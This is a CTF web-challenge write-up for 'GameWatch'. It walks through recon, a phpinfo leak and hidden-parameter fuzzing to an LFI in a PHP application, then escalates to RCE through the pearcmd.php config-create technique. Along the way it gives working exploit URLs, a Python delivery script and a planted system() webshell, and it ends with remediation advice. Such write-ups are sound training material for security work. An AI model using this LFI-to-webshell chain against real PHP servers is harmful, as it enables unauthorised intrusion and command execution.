# GameWatch — CTF Web Challenge Writeup

| Field | Detail |
|---|---|
| **Challenge** | GameWatch |
| **Category** | Web |
| **Difficulty** | Medium |
| **Points** | 100 |
| **Solves** | 29 |
| **Target** | `http://82.29.170.47:16218` |
| **Flag** | `VBD{p3arcmd_1s_st1ll_us3ful_t0_rce_976bd92e7b486eec224fedc39d8b797e}` |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Reconnaissance](#2-reconnaissance)
   - 2.1 [Port Scanning](#21-port-scanning)
   - 2.2 [Web Application Fingerprinting](#22-web-application-fingerprinting)
   - 2.3 [Application Mapping](#23-application-mapping)
3. [Enumeration Deep-Dive](#3-enumeration-deep-dive)
   - 3.1 [Directory & File Brute-Forcing](#31-directory--file-brute-forcing)
   - 3.2 [PHP Error Disclosure](#32-php-error-disclosure)
   - 3.3 [phpinfo() Discovery](#33-phpinfo-discovery)
4. [Eliminated Attack Vectors](#4-eliminated-attack-vectors)
   - 4.1 [SQL Injection](#41-sql-injection)
   - 4.2 [Server-Side Template Injection](#42-server-side-template-injection)
   - 4.3 [Direct LFI on Known Parameters](#43-direct-lfi-on-known-parameters)
5. [Vulnerability Discovery — Hidden LFI](#5-vulnerability-discovery--hidden-lfi)
   - 5.1 [Parameter Fuzzing on index.php](#51-parameter-fuzzing-on-indexphp)
   - 5.2 [Confirming the Include Path](#52-confirming-the-include-path)
6. [Exploitation — pearcmd LFI-to-RCE](#6-exploitation--pearcmd-lfi-to-rce)
   - 6.1 [Understanding the Attack](#61-understanding-the-attack)
   - 6.2 [Writing a Webshell via config-create](#62-writing-a-webshell-via-config-create)
   - 6.3 [Achieving Remote Code Execution](#63-achieving-remote-code-execution)
7. [Flag Capture](#7-flag-capture)
8. [Attack Chain Diagram](#8-attack-chain-diagram)
9. [Remediation](#9-remediation)
10. [Tools Used](#10-tools-used)

---

## 1. Executive Summary

**GameWatch** is a PHP 7.4 web application that serves as a game review and rating tracker, running on Apache 2.4.54 inside a Docker container. The application contains a hidden `page` GET parameter in `index.php` that performs a file inclusion without adequate sanitization. Combined with a publicly accessible `phpinfo()` page that reveals `register_argc_argv = On` and PEAR installed on the system, the vulnerability was escalated from Local File Inclusion (LFI) to full Remote Code Execution (RCE) via the classic **pearcmd.php `config-create`** technique.

The attack chain:
> **Hidden Parameter Discovery → LFI → pearcmd.php inclusion → Webshell drop → RCE → Flag**

---

## 2. Reconnaissance

### 2.1 Port Scanning

Initial port scanning with Nmap confirmed a single open service:

```bash
sudo nmap -sS -p16218 -sV -Pn 82.29.170.47
```

```
PORT      STATE SERVICE VERSION
16218/tcp open  http    Apache httpd 2.4.54 ((Debian))
```

**Key takeaway:** Apache 2.4.54 on Debian — a known Docker-based PHP hosting environment.

### 2.2 Web Application Fingerprinting

HTTP response headers revealed the full technology stack:

```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
```

- **Web server:** Apache 2.4.54
- **Language:** PHP 7.4.33
- **No security headers** (no CSP, no X-Frame-Options)
- **No cookies set** — no session management

An HTML comment on every page provided a subtle hint:

```html
<!-- build: 2024.3 | cfg: /app -->
```

The `cfg: /app` reference became significant later when we discovered the PHP `include_path`.

### 2.3 Application Mapping

The application ("GameWatch") is a game database and rating tracker with the following functional pages:

| Endpoint | Purpose | Parameters |
|---|---|---|
| `index.php` | Homepage with game listing, filters, pagination | `filter`, `p` |
| `game.php` | Individual game detail page | `id` (slug-based, e.g., `gta5`) |
| `search.php` | Full-text search by title/developer/genre | `q` |
| `config/games.php` | PHP data file (~2581 lines) — returns empty when accessed directly | — |

The application uses **catch-all routing** — all unknown URLs return the homepage (200 OK, 29,465 bytes). This design choice made traditional directory brute-forcing extremely difficult without content-based filtering.

**Data structure:** The application stores all 82 games in PHP arrays inside `config/games.php` — **no SQL database is used**. This was confirmed by:
- PHP error traces showing `get_game()` and `search_games()` functions defined in `config/games.php`
- The search function performing case-sensitive substring matching on titles, developers, and genres
- No SQL-related error messages regardless of input

---

## 3. Enumeration Deep-Dive

### 3.1 Directory & File Brute-Forcing

Due to the catch-all routing (everything returns 29,465 bytes with HTTP 200), standard directory enumeration was ineffective. We used `ffuf` with **response size filtering** to exclude the default page:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt \
     -u http://82.29.170.47:16218/FUZZ \
     -e .php,.txt,.bak,.zip,.old \
     -mc 200,204,301,302,307,401,403 \
     -fs 29465
```

**Results:**

| Path | Status | Size | Significance |
|---|---|---|---|
| `assets/` | 301 | 322 | Static assets (CSS, JS) |
| `config/` | 301 | 322 | PHP configuration/data files |
| `includes/` | 301 | 324 | PHP include files |
| **`info.php`** | **200** | **72,541** | **phpinfo() page — critical discovery** |
| **`pages/`** | **301** | **321** | **Include target directory — key to understanding LFI** |
| `search.php` | 200 | 128,794 | Search functionality |
| `server-status` | 403 | 280 | Apache mod_status (restricted) |

The discovery of `info.php` and `pages/` were the two pivotal findings that led to exploitation.

### 3.2 PHP Error Disclosure

By submitting array parameters where strings were expected, PHP generated informative `TypeError` messages:

```bash
curl "http://82.29.170.47:16218/game.php?id[]=test"
```

```
Fatal error: Uncaught TypeError: Argument 1 passed to get_game() must be of the type string, 
array given, called in /var/www/html/game.php on line 5 and defined in 
/var/www/html/config/games.php on line 2571
```

```bash
curl "http://82.29.170.47:16218/search.php?q[]=test"
```

```
Fatal error: Uncaught TypeError: Argument 1 passed to search_games() must be of the type string,
array given, called in /var/www/html/search.php on line 5 and defined in
/var/www/html/config/games.php on line 2581
```

Similarly, for `index.php`:

```bash
curl "http://82.29.170.47:16218/index.php?filter[]=test&p=1"
```

```
Warning: htmlspecialchars() expects parameter 1 to be string, array given in
/var/www/html/index.php on line 50
```

**Revealed code structure:**

| File | Line | Function/Call |
|---|---|---|
| `/var/www/html/game.php` | 5 | `get_game($id)` |
| `/var/www/html/search.php` | 5 | `search_games($q)` |
| `/var/www/html/config/games.php` | 2571 | Defines `get_game()` |
| `/var/www/html/config/games.php` | 2581 | Defines `search_games()` |
| `/var/www/html/index.php` | 50 | `htmlspecialchars()` on filter param |

### 3.3 phpinfo() Discovery

The `info.php` endpoint exposed a full `phpinfo()` page. This was the most impactful finding of the enumeration phase. Critical configuration values extracted:

```
PHP Version:            7.4.33
Server API:             Apache 2.0 Handler
System:                 Linux 6af6ecb6297e (Docker container)
DOCUMENT_ROOT:          /var/www/html
Loaded Configuration:   (none)  ← No php.ini loaded!
```

**Security-critical settings:**

| Directive | Value | Impact |
|---|---|---|
| **`register_argc_argv`** | **On** | **Enables pearcmd.php exploitation** |
| **`include_path`** | **`.:/app/gamewatch:/usr/local/lib/php`** | **Reveals /app path & PEAR location** |
| **`disable_functions`** | **(none)** | **No function restrictions — `system()` available** |
| **`open_basedir`** | **(none)** | **No filesystem restrictions** |
| `allow_url_include` | Off | Cannot include remote URLs |
| `allow_url_fopen` | On | Can open remote URLs (but not include) |
| `display_errors` | On | Error messages visible |
| `file_uploads` | On | File uploads enabled |

**Additional .ini files parsed:**
```
/usr/local/etc/php/conf.d/docker-php-ext-sodium.ini
/usr/local/etc/php/conf.d/pearcmd.ini          ← PEAR is installed!
```

**Loaded Apache modules (relevant):**
```
mod_rewrite    ← Explains the catch-all routing
mod_php7       ← PHP runs as Apache module
```

**Environment variables:**
```
HOSTNAME:      6af6ecb6297e          (Docker container)
CHALLENGE_ID:  64
TEAM_ID:       510
USER_ID:       510
```

The combination of `register_argc_argv = On` and PEAR being installed immediately suggested the **pearcmd LFI-to-RCE** attack vector — but first, we needed to find the LFI.

---

## 4. Eliminated Attack Vectors

Before discovering the actual vulnerability, extensive testing eliminated several common web attack classes:

### 4.1 SQL Injection

Exhaustive SQLi testing was performed using `sqlmap` with maximum aggressiveness:

```bash
# All parameters on index.php
sqlmap -u "http://82.29.170.47:16218/index.php?filter=all&p=1" -p "filter,p" \
       --level=5 --risk=3

# Game ID parameter
sqlmap -u "http://82.29.170.47:16218/game.php?id=gta5" \
       --level=5 --risk=3 --tamper=space2comment

# Search parameter with header injection
sqlmap -u "http://82.29.170.47:16218/game.php?id=gta5" \
       --level=5 --risk=3 --headers="User-Agent: *\nReferer: *"
```

**Result:** All parameters confirmed **NOT injectable**. This is consistent with the application using PHP arrays rather than a SQL database.

### 4.2 Server-Side Template Injection

```bash
curl "http://82.29.170.47:16218/search.php?q={{7*7}}"
# → Reflected literally as "{{7*7}}" — not evaluated

curl "http://82.29.170.47:16218/search.php?q=${7*7}"
# → Reflected literally — no template engine
```

### 4.3 Direct LFI on Known Parameters

Standard LFI attempts on all known parameters returned normal application responses:

```bash
# Path traversal on game.php
curl "http://82.29.170.47:16218/game.php?id=../../../etc/passwd"
# → Returns "game not found" page

# PHP filter wrapper on game.php
curl "http://82.29.170.47:16218/game.php?id=php://filter/convert.base64-encode/resource=config/games"
# → Returns "game not found" page

# Path traversal on filter parameter  
curl "http://82.29.170.47:16218/index.php?filter=../../../etc/passwd&p=1"
# → Returns page with 0 games (filter treated as category name)
```

The known parameters (`filter`, `p`, `id`, `q`) were all properly handled — the vulnerability was in a **hidden parameter**.

---

## 5. Vulnerability Discovery — Hidden LFI

### 5.1 Parameter Fuzzing on index.php

Knowing from error messages that `index.php` has logic beyond just `filter` and `p`, and that a `pages/` directory exists on the server, we fuzzed for hidden parameters by comparing response sizes:

```bash
for p in page view route action include file load template layout \
         r f inc src path module component func render; do
    size=$(curl -s -o /dev/null -w "%{size_download}" \
           "http://82.29.170.47:16218/index.php?${p}=test&filter=all&p=1")
    if [ "$size" != "29465" ]; then
        echo "DIFFER: $p => $size"
    fi
done
```

```
DIFFER: page => 27869
```

The `page` parameter returned a **different response size** (27,869 vs 29,465) — a clear indicator that it triggers different server-side behavior.

### 5.2 Confirming the Include Path

Comparing the response with and without the `page` parameter using `diff`:

```bash
diff <(curl -s "http://82.29.170.47:16218/index.php?page=test&filter=all&p=1") \
     <(curl -s "http://82.29.170.47:16218/index.php?filter=all&p=1")
```

```diff
47,50c47,76
< Warning: include(./pages/test.php): failed to open stream: No such file or
< directory in /var/www/html/index.php on line 44
< 
< Warning: include(): Failed opening './pages/test.php' for inclusion
< (include_path='.:/app/gamewatch:/usr/local/lib/php')
< in /var/www/html/index.php on line 44
---
> <section class="featured-section">
>     ...normal page content...
```

**Confirmed vulnerability:** `index.php` line 44 performs:

```php
include("./pages/" . $_GET['page'] . ".php");
```

The `page` parameter is passed directly into `include()` with:
- A `./pages/` prefix
- A `.php` suffix appended
- **No sanitization or path validation**

The `.php` suffix is not a problem because PHP 7.4 will still traverse paths with it appended — and for pearcmd exploitation, the target (`pearcmd.php`) already has a `.php` extension naturally.

---

## 6. Exploitation — pearcmd LFI-to-RCE

### 6.1 Understanding the Attack

The **pearcmd LFI-to-RCE** technique exploits three conditions:

1. ✅ **Local File Inclusion exists** — `include("./pages/" . $_GET['page'] . ".php")`
2. ✅ **`register_argc_argv = On`** — PHP populates `$_SERVER['argv']` from the query string
3. ✅ **PEAR is installed** — `pearcmd.php` exists at `/usr/local/lib/php/pearcmd.php`

When `pearcmd.php` is included, it reads `$_SERVER['argv']` (the raw query string split by `+`) and interprets them as PEAR CLI commands. The `config-create` command writes a configuration file to an arbitrary path — and we control the content via the "root path" argument, which gets embedded into the config file **without any encoding**.

By injecting PHP code into the root path argument, we create a file that is simultaneously a valid PEAR config **and** a PHP webshell.

### 6.2 Writing a Webshell via config-create

The exploit URL structure:

```
http://target/index.php
  ?page=../../../../usr/local/lib/php/pearcmd     ← LFI to pearcmd.php
  &+config-create                                  ← PEAR command
  +/<?=system($_GET[cmd])?>                        ← "Root path" containing PHP code
  +/tmp/shell.php                                  ← Output file path
```

Due to the `+` characters being split by `register_argc_argv` into separate arguments, pearcmd receives:

```
argv[0] = "page=../../../../usr/local/lib/php/pearcmd"
argv[1] = "config-create"
argv[2] = "/<?=system($_GET[cmd])?>"    ← PHP webshell code as "root path"
argv[3] = "/tmp/shell.php"             ← File to create
```

Execution using Python to avoid shell escaping complications:

```python
import urllib.request
url = ('http://82.29.170.47:16218/index.php'
       '?page=../../../../usr/local/lib/php/pearcmd'
       '&+config-create'
       '+/<?=system($_GET[cmd])?>+/tmp/shell.php')
resp = urllib.request.urlopen(url)
data = resp.read().decode()
```

**Server response confirmed success:**

```
Successfully created default configuration file "/tmp/shell.php"
```

The created file `/tmp/shell.php` contains a PEAR config with our PHP code embedded as path values:

```php
#PEAR_Config 0.9
a:13:{s:7:"php_dir";s:33:"/<?=system($_GET[cmd])?>/pear/php";s:8:"data_dir";s:34:"/<?=system($_GET[cmd])?>/pear/data"; ...}
```

When PHP parses this file, it executes every `<?=system($_GET[cmd])?>` occurrence.

### 6.3 Achieving Remote Code Execution

With the webshell written to `/tmp/shell.php`, we included it via the same LFI:

```
http://82.29.170.47:16218/index.php?page=../../../../tmp/shell&cmd=id
```

**Response contained:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE confirmed as `www-data`.**

---

## 7. Flag Capture

With arbitrary command execution, we located and read the flag:

```bash
# List root directory
cmd: ls -la /
```

```
-r--r--r--   1 root root   68 Mar  4 17:27 flag_c37b9551589cc2cdb4c8d3d143258a8d.txt
-rwxr-xr-x   1 root root    0 Mar  4 17:27 .dockerenv
drwxr-xr-x   3 root root 4096 Mar  2 16:23 app
...
```

```bash
# Read the flag
cmd: cat /flag_c37b9551589cc2cdb4c8d3d143258a8d.txt
```

```
VBD{p3arcmd_1s_st1ll_us3ful_t0_rce_976bd92e7b486eec224fedc39d8b797e}
```

---

## 8. Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACK CHAIN                                 │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────┐    ffuf with     ┌──────────────┐                 │
│  │  Recon &     │   size filter    │  info.php    │                 │
│  │  Enumeration │ ──────────────►  │  (phpinfo)   │                 │
│  └──────────────┘                  └──────┬───────┘                 │
│                                           │                         │
│              Reveals: register_argc_argv=On                         │
│              Reveals: PEAR installed                                │
│              Reveals: No disable_functions                          │
│              Reveals: include_path has /usr/local/lib/php           │
│                                           │                         │
│                                           ▼                         │
│  ┌──────────────┐   Param fuzzing  ┌──────────────┐                 │
│  │  index.php   │   page=test      │  LFI Found   │                 │
│  │  analysis    │ ──────────────►  │  line 44     │                 │
│  └──────────────┘   size differs!  └──────┬───────┘                 │
│                                           │                         │
│          include("./pages/".$_GET['page'].".php")                   │
│                                           │                         │
│                                           ▼                         │
│  ┌──────────────────────────────────────────────────┐               │
│  │  LFI to pearcmd.php via path traversal           │               │
│  │  page=../../../../usr/local/lib/php/pearcmd      │               │
│  └──────────────────────────┬───────────────────────┘               │
│                             │                                       │
│     register_argc_argv=On splits query string by "+"                │
│     pearcmd interprets: config-create <root> <file>                 │
│                             │                                       │
│                             ▼                                       │
│  ┌──────────────────────────────────────────────────┐               │
│  │  Webshell written to /tmp/shell.php              │               │
│  │  Contains: <?=system($_GET[cmd])?>               │               │
│  └──────────────────────────┬───────────────────────┘               │
│                             │                                       │
│     LFI again: page=../../../../tmp/shell&cmd=...                   │
│                             │                                       │
│                             ▼                                       │
│  ┌──────────────────────────────────────────────────┐               │
│  │  RCE as www-data                                 │               │
│  │  cat /flag_c37b9551589cc2cdb4c8d3d143258a8d.txt  │               │
│  └──────────────────────────────────────────────────┘               │
│                                                                     │
│  FLAG: VBD{p3arcmd_1s_st1ll_us3ful_t0_rce_976bd92e7b486eec224fe..}  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 9. Remediation

| # | Issue | Fix |
|---|---|---|
| 1 | **Unsanitized `include()` with user input** | Whitelist allowed page values: `$allowed = ['home','games']; if (!in_array($_GET['page'], $allowed)) die();` |
| 2 | **`phpinfo()` publicly accessible** | Remove `info.php` from production. Never deploy diagnostic pages. |
| 3 | **`register_argc_argv = On`** | Set `register_argc_argv = Off` in `php.ini`. This is the default for web SAPIs but was not set here because no `php.ini` was loaded. |
| 4 | **PEAR installed in production** | Remove PEAR from production Docker images: `rm -rf /usr/local/lib/php/pear*` |
| 5 | **`display_errors = On`** | Set `display_errors = Off` and `log_errors = On` in production. The error messages revealed full file paths and code structure. |
| 6 | **No `disable_functions`** | Restrict dangerous functions: `disable_functions = system,exec,passthru,shell_exec,popen,proc_open` |
| 7 | **No `open_basedir`** | Set `open_basedir = /var/www/html:/tmp` to restrict file access. |
| 8 | **Missing security headers** | Add `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options` headers. |

---

## 10. Tools Used

| Tool | Purpose |
|---|---|
| **Nmap** | Port scanning and service version detection |
| **ffuf** | Directory and file brute-forcing with size-based filtering |
| **curl** | Manual HTTP request crafting and parameter testing |
| **sqlmap** | Automated SQL injection testing (negative results) |
| **Python 3** | Exploit delivery (avoiding shell escaping issues with PHP code in URLs) |
| **diff** | Comparing HTTP responses to identify parameter-induced changes |
| **Browser** | Application mapping and visual inspection |

---

*Writeup by l27sen — March 4, 2026*
